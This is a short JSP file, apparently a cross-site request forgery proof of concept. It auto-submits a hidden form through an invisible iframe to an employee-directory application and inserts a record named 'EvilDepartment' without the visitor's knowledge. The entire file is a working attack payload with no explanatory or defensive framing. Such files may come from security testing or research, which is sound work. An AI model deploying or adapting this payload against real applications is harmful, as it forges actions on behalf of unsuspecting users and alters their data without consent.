<%
//
//   Filename: XSRF.jsp
//
%>
<form method="GET" name="evilform" target="hiddenframe" action="http://calculus.sisl.rites.uic.edu:443/5f3decd5/empldir/DepsRecord.jsp?name=EvilDepartment&FormName=deps&FormAction=insert&">
<input type="Text" value="EvilDepartment" name="name"></input>
<input type="hidden" value="deps" name="FormName"></input>
<input type="hidden" value="insert" name="FormAction"></input>
</form>
<iframe name="hiddenframe" style="display:none"></iframe>
<script>document.evilform.submit();</script>



